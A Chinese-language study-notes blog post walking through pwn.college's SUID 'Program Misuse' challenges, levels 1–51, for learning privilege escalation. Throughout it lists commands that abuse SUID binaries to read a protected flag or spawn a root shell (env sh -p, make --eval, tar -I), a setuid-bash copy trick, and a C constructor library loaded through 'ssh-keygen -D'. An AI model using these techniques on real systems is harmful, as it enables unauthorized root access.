# 0x1.前言

本篇是在[pwncollege](https://dojo.pwn.college/)网站通关学习笔记的第二篇，Program Misuse部分。

终于来到baby阶段了，胚胎阶段有142关，着实有点漫长，不过真的有点害怕后面的题不会做，网上又找不到教程，走一步是一步吧。（做题遇到困境可以点击网站上方的Chat进入讨论区，可以在里面交流思路，是个很好的学习途径。）

这一部分讲了通过suid位来提权的方法，涉及了很多linux中常见的可以提权的工具的讲解与实践。

# 0x2.通关记录

### 0.SUID提权

SUID的目的就是：让本来没有相应权限的用户运行这个程序时，可以访问他没有权限访问的资源。

它仅对二进制程序有效。

因此/flag虽然是root用户只读的，我们连接挑战程序时是hacker用户，但是运行有suid位的root程序还是可以读到flag的值。

### 1.level1~6,10常见读取文件命令

1：给cat设置了suid，调用它就能读取flag。

1~6，10： **常见的读取文件内容的命令** ，依次为：cat、more、less、tail、head、sort、rev

其中rev是反向输出文件内容，可以利用两个rev来获取正向内容，如下：

    
    
    rev /flag | rev

### 2.level7~9常见文本编辑器

7~9： **常见的文本编辑器** ，依次为：vim、emacs、nano

### 3.level11~13常见16进制读取命令

11~13： **常见的16进制读取命令** ，依次为：od、hexdump(hd)、xxd

od：用于输出文件的八进制、十六进制或其它格式编码的字节，通常用于显示或查看文件中不能直 接显示在终端的字符，可以od -w100 -c
/flag来显示flag内容，中间的空格可以用sed 's# ##g'来处理。

hexdump（简称hd）：一般用来查看“二进制”文件的十六进制编码，但实际上它能查看任何文件，而不只限于 二进制文件，可以hd -C
/flag来显示字符串。

xxd：和hexdump类似，不需要加参数就能看到字符串

    
    
    od -w100 -c /flag|sed 's# ##g'  
    hd -c /flag  ||  hexdump -C /flag  
    通过过滤器过滤：hexdump -C /flag | awk -F"|" '{print $2}' | xargs | sed "s# ##g"  
    xxd /flag

### 4.level14~15base系列编码命令

14~15： **base系列编码命令** ，依次为：base32、base64

base(32、64)：base系列编码，可以加-d解码，所以有：base32 /flag | base32 -d读取flag

    
    
    base32 /flag | base32 -d  
    gzip -c /flag | gzip -d

### 5.level16分割文件命令

16： **分割文件命令** ，为：splite

splite可以将一个大文件分割成很多个小文件，有时需要将文件分割成更小的片段，比如为提高可读性，生成日志等，直接split
/flag，它会在本目录依次生成名为xaa xab xac xad xae xaf xag xah xai xaj小文件，可以通过-b来设置单个文件的大小，单位为字节。

### 6.level17~23常见压缩解压缩命令

17~23： **常见压缩解压缩命令** ，依次为：gzip、bzip2、zip、tar、ar、cpio、genisoimage

ar命令
是一个建立或修改备存文件，或是从备存文件中抽取文件的工具，ar可让您集合许多文件，成为单一的备存文件。在备存文件中，所有成员文件皆保有原来的属性与权限

cpio命令 主要是用来建立或者还原备份档的工具程序，cpio命令可以复制文件到归档包中，或者从归 档包中复制文件。

genisoimage可将指定的目录与文件做成ISO 9660格式的映像文件，以供刻录光盘。

    
    
    gzip -c /flag | gzip -d  
    bzip2 -c /flag | bzip2 -d  
    LFILE=/flag;TF=$(mktemp -u);zip $TF $LFILE;unzip -p $TF  
    LFILE=/flag;tar xf "$LFILE" -I '/bin/sh -c "cat 1>&2"'  
    TF=$(mktemp -u);LFILE=/flag;ar r "$TF" "$LFILE";cat "$TF"  
    echo "/flag" | cpio -o  
    genisoimage -sort "/flag"

### 7.level24~31可执行命令的常见命令

24~31： **可执行命令的常见命令** ，依次为：env、find、make、nice、timeout、stdbuf、setarch、watch

如果可以执行命令并且有suid位，那么一般就可以通过执行`sh -p`或是`bash
-p`来得到root的shell了。（原理我也还不太清楚，不清楚能起作用的范围。不过根据<https://gtfobins.github.io/gtfobins/env/>的内容，说：`If
it is used to run sh -p, omit the -p argument on systems like Debian (<=
Stretch) that allow the default sh shell to run with SUID
privileges.`，应该Debian和Ubuntu都能起作用吧。）

make命令 是GNU的工程化编译工具，用于编译众多相互关联的源代码文件，以实现工程化的管理，提高开发效率。

nice命令 用于以指定的进程调度优先级启动其他的程序。

timeout命令作用是运行指定命令，如果在指定时间后在运行则杀死该进程。

stdbuf用于修改标准流的缓冲模式和大小。（看到这个命令，我赶紧回去测试了一下第一部分的第137关，看看当时获取不到输出是不是真的是缓冲区的问题，然后发现用stdbuf将缓冲区设为0之后，可以获取到一部分数据，但获取不到全部，看来缓冲区只是一部分的问题，还有的可能就是像之前推断的那样是信号的原因了。）

setarch命令好像取自bsdutils包，是取自BSD的系统工具，好像是用来修改运行程序的架构的命令，用它好像可以执行32位的程序？

watch命令，可以将命令的输出结果输出到标准输出设备，多用于周期性执行命令/定时执行命令。

提权shell就可以直接这样运行了：

    
    
    env sh -p  
    COMMAND='/bin/sh -p';make -s --eval=$'x:\n\t-'"$COMMAND"

嫌麻烦就直接读取flag：

    
    
    env cat /flag  
    find . -exec cat /flag \; -quit  
    COMMAND='cat /flag';make -s --eval=$'x:\n\t-'"$COMMAND"  
    nice cat /flag  
    timeout 7d cat /flag  
    stdbuf -i0 cat /flag  
    setarch $(arch) cat /flag  
    watch -x cat /flag

### 8.level32常见的网络连接工具

32： **常见网络连接工具** ，为：socat

    
    
    socat -u "file:/flag" -
### 9.level33脚本对话框工具

33： **脚本对话框工具** ，为：whiptail

    
    
    whiptail --textbox --scrolltext /flag 20 80

### 10.level34~36流式文本编辑器

34~36： **流式文本编辑器** ，为：awk、sed、ed

awk 是一种编程语言，用于在linux/unix下对文本和数据进行处理。数据可以来自标准输入
(stdin)、一个或多个文件，或其它命令的输出。它支持用户自定义函数和动态正则表达式等先进功能，是linux/unix下的一个强大编程工具。它在命令行中使用，但更多是作为脚本来使用。awk有很
多内建的功能，比如数组、函数等，这是它和C语言的相同之处，灵活性是awk最大的优势。

ed命令 是单行纯文本编辑器，它有命令模式（command mode）和输入模式（input mode）两种工
作模式。ed命令支持多个内置命令，常见内置命令如下：

  1. A # 切换到输入模式，在文件的最后一行之后输入新的内容；

  2. C # 切换到输入模式，用输入的内容替换掉最后一行的内容；

  3. i # 切换到输入模式，在当前行之前加入一个新的空行来输入内容；

  4. d # 用于删除最后一行文本内容；

  5. n # 用于显示最后一行的行号和内容；

  6. w # <文件名>：一给定的文件名保存当前正在编辑的文件；

  7. q # 退出ed编辑器。

    
    
    awk '{ print }' /flag  
    awk 'BEGIN{while(getline < "/flag"){print $0;};close("/etc/passwd");}'  
    sed -n 'p' /flag  
    echo n | ed /flag

### 11.level37~38修改文件归属者或权限

37~38： **修改文件归属者或权限** ，为：chown、chmod

chown命令
改变某个文件或目录的所有者和所属的组，该命令可以向某个用户授权，使该用户变成指定文件的所有者或者改变文件所属的组。用户可以是用户或者是用户D，用户组可以是组名或组id。文件名可以使由空格分开的文件列表，在文件名中可以包含通配符。

chmod命令 可以通过符号组合的方式更改目标文件或目录的权限。 通过八进制数的方式更改目标文件或目录的权限。
通过参考文件的权限来更改目标文件或目录的权限。

    
    
    chown -c hacker /flag  
    chmod 777 /flag

### 12.level39~40常见移动文件命令

39~40： **常见移动文件命令** ，cp、mv

    
    
    cp /flag /dev/stdout

mv想不到利用方法啊，虽然可以改`/etc/passwd`来提权，但是那需要su也有suid权限啊（该方法的详细讲解：<https://steflan-security.com/linux-privilege-escalation-suid-binaries/>），这道题没有，这咋办啊。话说为啥cp到标准输出就能得到结果，mv就不行？这两个感觉差不多啊。

不过找了下还是找到一个相关的博客，原文网址【WorkIndia】：[The Dark Side
of`mv`Command](https://medium.com/workindia-in/the-dark-side-of-mv-command-3419c1bd619)

上面提到可以将cat的二进制移动到mv这里，然后把mv当做cat用，这样就可以读取flag了，不过他那时候的mv可能和现在的mv不太一样了，他那样利用的前提是移动前的二进制文件移动后采用的是原来mv的权限，但是实际上我在使用mv移动文件时会将原文件的权限一起复制过来。

不过没关系，这个题目中的挑战程序作用就是自动设置`/usr/bin/mv`的`suid`位，所以我移动之后在调用一次程序就行了，看来正常通关过程就是这样了：

    
    
    /challenge/babysuid_level40 && mv /usr/bin/bash /usr/bin/mv && /challenge/babysuid_level40 && mv -p

这样就提权成功了。

### 13.level41~44脚本解释器

41~44：脚本解释器

41：perl，虽然不太清楚它操作文件的语法，但是使用`-d`参数就可以调试运行脚本，也能读取到flag。

42：python，运行即可。

43：ruby，查一下读取文件的方法：

写入43.ruby，然后运行。

    
    
    #!/usr/bin/ruby  
    ​  
    aFile = File.new("/flag", "r")  
    if aFile  
    content = aFile.sysread(100)  
    puts content  
    else  
    puts "Unable to open file!"  
    end

44：bash，直接`bash -p`提权。

### 14.level45~50其他可读取文件的命令

45：date，原来的作用是显示当前时间或者将时间按格式输出，但是用`-f`可以读取文件，如果文件内容不是正常的日期，则会回显出来。

46：dmesg，dmesg命令被用于检查和控制内核的环形缓冲区。kernel会将开机信息存储在ring buffer中。您
若是开机时来不及查看信息，可利用dmesg来查看。开机信息保存在 /var/log/dmesg 文件里。

suid下可以查看文件：

    
    
    dmesg -rF /flag

47：wc，wc命令原作用是统计文件的字节数、字数、行数。但是通过`--files0-from`参数可以从文件中读取文件名，所以如果文件内容不是一个正常的文件名的话就会回显出来，如下：

    
    
    wc --files0-from=/flag

48：gcc，gcc是基于C/C++的编译器，但是可以用一些参数来读取文件内容，如下：

    
    
    gcc -x c -E /flag

49：as，as是GNU组织推出的一款汇编语言编译器，它支持多种不同类型的处理器。报错会回显问文件信息。

想要去除一些杂乱信息就这样：

    
    
    as @/flag

50：wget，wget是Linux系统下载文件工具。

一般可以通过`-i`参数来获取文件中内容，不过发现它把大写字母全部转成小写字母了，这不是我们想要的。

可以利用它的文件上传功能来进行读取文件的原本内容，如下：

    
    
    nc -lp 8888 & wget --post-file=/flag http://127.0.0.1:8888

### 15.level51一般程序suid提权思路：ssh-keygen

51： **一般程序suid提权思路** ，为：ssh-keygen

这个真的有点卡人，研究了好长时间。

坑：

  1. 可以使用这行c代码来查询当前执行uid（不要用getuid()，坑了我了）：
    
        printf("euid:%d\n",geteuid());

如果为0代表当前执行权限为root。

  2. 在使用euid=0的权限时不要使用system()函数来运行shell代码，不然会以当前uid权限来执行shell代码，估计也是运行dash而且不会识别euid，反正卡的我很无语。
    
        //简单来说就是不要用这个：  
    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");  
    ​  
    //而用这个：  
    char *argvv[]={"bash","-p",NULL};  
    execvp("/bin/bash",argvv);

知识点：

  1. 首先是ssh-keygen用-D参数可以直接运行任意的共享库，如果有suid的话就能运行我们的恶意代码造成提权，共享库的创建方式见下方。

使用方法：

    
        ssh-keygen -D ./su.os

  2. 可以利用c语言代码：
    
        sendfile(1,open("/flag",0),0,4096);

来打开文件，并且将内容发送给标准输出显示。

  3. 可以利用设置c语言的attribute属性来使函数在程序预处理阶段运行：
    
        #include<stdio.h>  
    #include<stdlib.h>  
    static void inject() __attribute__((constructor));  
    void inject(){  
    printf("euid:%d\n",geteuid());  
    sendfile(1,open("/flag",0),0,4096);  
    }

  4. c程序的链接方式包括 **静态链接** 和 **动态链接** 两种。

 **静态链接库**
，在以前，程序是独立的，编个程序要从头到尾自己考虑。后来为了方便，把通用的程序放在一起，这就是库，遇到需要类似的功能就可以调用。但是这个有个问题，计算机不知道你要用的是链接库哪一个程序，
所以它不得不将链接库全部程序包含进来，使得程序很大。 **动态链接库**
，本身和静态链接没什么区别，也是把通用代码写进一些独立文件里，但是在编译方面，微软绕了个圈子，并没有采取把库文件加进程序的方法，而是把库文件做成已经编译好的程序，给它们开个交换数据的接口，写程序的时候，一旦要使用某个库文件的一个功能函数，系统就把这个库文件调入内存，连接上这个程序占有的任务进程，然后执行程序要用的功能函数，并把结果返回给程序显示出来，在我们看来，就像是程序自己带有的功能一样。
完成需要的功能后，这个DLL停止运行，整个调用过程结束。
DLL是编译好的代码，与一般程序没什么大差别，只是它不能独立运行，需要程序调用。DLL的代码和其他程序几平没什么两样，仅仅是接口和启动模式不同。

  5. gcc可以通过`-shared`参数来创建共享库，共享库不能单独运行，它相当于一个必须被别人调用才能运行的程序，它与普通二进制程序的区别可以通过file命令来查看，共享库没有`interpreter`这样的字段，也就是没有链接解释器。
    
        gcc 51.c -shared -o su.os

  6. c程序中可以利用<dlfcn.h>头文件中的一系列函数dlopen，dlclose来加载运行共享库，详细说明可以通过：
    
        man dlopen

来查看。

  7. ldd命令 用于打印程序或者库文件所依赖的共享库列表。我们可以利用它来查看是否有可操作的os共享库，注入我们的代码。

  8. 另外一种查询方式是利用strace来查看程序运行全程，然后可以用grep来过滤一下：
    
        strace /usr/local/bin/suid-so 2>&1 | grep -i -E "open|access|no such file"

参考：

  1. 首先在b站的这个视频学到了基本的 **suid提权之os文件注入** 方法：[suid提权之os文件注入-哔哩哔哩](https://b23.tv/b6K6MPr)

  2. 然后在这个视频学到了怎么做这道题，顺带知道了普通可执行程序和共享库之间的区别，还有lld命令的基本使用：[CSE 466: Computer Systems Security - Connor's Office Hours 08/26/2021](https://www.youtube.com/watch?v=14mIjpOXnrM&t=2878s)

通关过程：

编写51.c：

    
    
    #include<stdio.h>  
    #include<stdlib.h>  
    static void inject() __attribute__((constructor));  
    void C_GetFunctionList(){  
    printf("euid:%d\n",geteuid());  
    sendfile(1,open("/flag",0),0,4096);  
    //system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");  
    char *argvv[]={"bash","-p",NULL};  
    execvp("/bin/bash",argvv);  
    }

编译后用ssh-keygen的-D参数运行即可：

    
    
    gcc 51.c -shared -o su.os  
    /challenge/babysuid_level51  
    ssh-keygen -D ./su.os

# 0x3.结尾

这一部分蛮有意思的，希望大家也玩的开心~

非常感谢pwncollege这个网站免费的为我们提供学习资源，也感谢大家的耐心观看，希望你继续关注我下面的文章，会随着学习讲解后面的模块，也希望你和我共同进步，有什么想法欢迎在评论区留言！

